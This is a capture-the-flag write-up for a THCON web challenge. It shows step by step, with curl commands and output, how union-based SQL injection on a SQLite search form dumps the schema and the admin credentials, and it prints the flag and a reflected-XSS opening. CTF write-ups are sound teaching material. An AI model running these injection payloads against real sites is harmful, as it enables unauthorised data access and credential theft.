# XSS iN tHe Web — 1

- **Category:** Web
- **Target:** `http://xss-in-the-web.ctf.thcon.party`

```
THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}
```

## TL;DR

- The "Agent search" form interpolates `id` into a raw SQL query. UNION-based SQLi with `0 UNION SELECT a,b -- ` works and the result lands at `/view-result`.
- `sqlite_version()` confirms SQLite 3.41.2; `sqlite_master` exposes the full schema including a non-default `adminDBtable`.
- Dump `adminDBtable.username, password` → `admin / S_P3rSicreteP3asseworde%%`. Log in, the dashboard renders the flag.
- Despite the challenge name, no XSS is required for part 1 — straight SQLi to login.

## 1. Recon

```
$ curl -sI http://xss-in-the-web.ctf.thcon.party/
Server: Werkzeug/2.3.6 Python/3.11.4
```

The page has a single search form, plus a `/view-result` link that renders the last query result. Routes `/login`, `/dashboard`, `/add_agent` exist; the latter two redirect to `/login` when unauthenticated.

## 2. Confirm SQLi and column count

A quote breaks the query:

```
$ curl -s "http://.../?id=1'"
500 Internal Server Error
```

Two columns in the SELECT (deduced from a UNION test):

```
$ curl -s "http://.../?id=0 UNION SELECT 1,2-- "
$ curl -s http://.../view-result
| 1 | 2 |    ← rendered as Name | Description
```

So the underlying query is `SELECT name, description FROM agents WHERE id = <input>`, and `id=0` returns nothing, leaving only our injected row.

## 3. Fingerprint and schema

```
$ curl -s "http://.../?id=0 UNION SELECT sqlite_version(),'x'-- "
$ curl -s http://.../view-result
| 3.41.2 | x |
```

SQLite, so we use `sqlite_master`:

```
$ curl -s "http://.../?id=0 UNION SELECT name,sql FROM sqlite_master-- "
$ curl -s http://.../view-result
| agents       | CREATE TABLE agents (id INTEGER PRIMARY KEY, name TEXT, description TEXT)        |
| adminDBtable | CREATE TABLE adminDBtable (id INTEGER PRIMARY KEY, username TEXT, password TEXT) |
```

`adminDBtable` is not a default; it's the target.

## 4. Dump credentials

```
$ curl -s "http://.../?id=0 UNION SELECT username,password FROM adminDBtable-- "
$ curl -s http://.../view-result
| admin | S_P3rSicreteP3asseworde%% |
```

## 5. Login → dashboard

`%` is the form-encoded percent literal — escape it on the way in.

```
$ curl -si -c jar.txt -X POST \
    -d "username=admin&password=S_P3rSicreteP3asseworde%25%25" \
    http://.../login
HTTP/1.1 302 Found
Location: /dashboard

$ curl -s -b jar.txt http://.../dashboard | grep -o 'THC{[^}]*}'
THC{W1tH_eYe5_Wid3_0p3ns_WesTANd}
```

## 6. The XSS angle (not used here)

`/view-result` reflects UNION-injected values without escaping, so injecting `<script>...</script>` as the `name` column would execute in another visitor's browser. That route stays useful for part 2 — for this part the SQLi-to-credentials path is the shortest one.

## 7. Methodology

- **Single-quote canary first.** A `500` on `id=1'` proves "string-concat into SQL" in one request.
- **Match column count by `UNION SELECT 1,2,...,N`.** Find `N` before bothering with the rest. The minimum-friction next step is dumping the schema.
- **`sqlite_master` is the SQLite analog of `information_schema.tables/columns`.** It contains both the table list and the original `CREATE` statement — a single query gives you everything you'd otherwise need three for in MySQL.
- **Always test the obvious dashboard login before chaining XSS.** When the SQLi exposes credentials directly, no client-side trickery is needed. Keep the chain as short as the puzzle allows.
- **Encode `%` in form bodies as `%25`.** A literal `%` in URL-encoded data is a parsing error and silently corrupts the password. Easy to miss when the cleartext was extracted from a database verbatim.
